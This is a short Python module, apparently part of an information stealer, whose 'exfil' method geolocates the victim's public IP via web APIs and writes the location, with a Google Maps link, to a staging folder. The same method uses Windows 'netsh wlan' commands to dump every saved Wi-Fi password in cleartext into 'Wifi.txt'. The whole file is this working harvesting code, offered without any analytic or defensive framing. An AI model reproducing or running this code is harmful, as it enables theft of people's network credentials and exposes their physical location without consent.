import requests , os , re
from subprocess import check_output

class Network:


    def get_location_info(ip):
        req = requests.post(f'https://ipwhois.app/json/{ip}')
        return req.json()
    
    def get_public_ip():
        req = requests.get('https://api.ipify.org?format=json')
        
        return req.json()['ip']
    

    def get_google_maps_url(latitude , longitude):

        return f'https://www.google.com/maps?q={latitude},{longitude}'

    def exfil(vpath : str):

        if not os.path.exists(vpath):

            os.mkdir(vpath)

        HEADER = '=' * 8
        
        ip = Network.get_public_ip()

        loc_info  = Network.get_location_info(ip)

        maps_url = Network.get_google_maps_url(loc_info['latitude'] , loc_info['longitude'])

        final = ''

        for (key , value) in loc_info.items():

            final += f'{key.capitalize()} : {value}\n'

        
        final += f'Google Maps Location : {maps_url}\n'

        f = open(os.path.join(vpath , 'Public.txt') , 'a' , errors='ignore' , encoding='utf8')

        f.write(final)

        f.close()


        ### WIFI PASSWORDS ###

        regx = re.compile('\ *All User Profile\ *:\ *(.*)')

        pwd_regx = re.compile('\ *Key Content\ *:\ *(.*)')

        output = check_output('netsh wlan show profiles' , errors='ignore', shell=True)

        f = open(os.path.join(vpath , 'Wifi.txt') , 'a' , errors='ignore' , encoding='utf8')

        for ssid in re.findall(regx,output):

            clear = check_output(f'netsh wlan show profile {ssid} key=clear' ,errors='ignore' , shell=True)

            for password in re.findall(pwd_regx , clear):


                f.write(f'{HEADER}\nName : {ssid}\nPassword : {password}\n')

        f.close()

        return ip , maps_url , loc_info['country'] , loc_info['city']


            

        

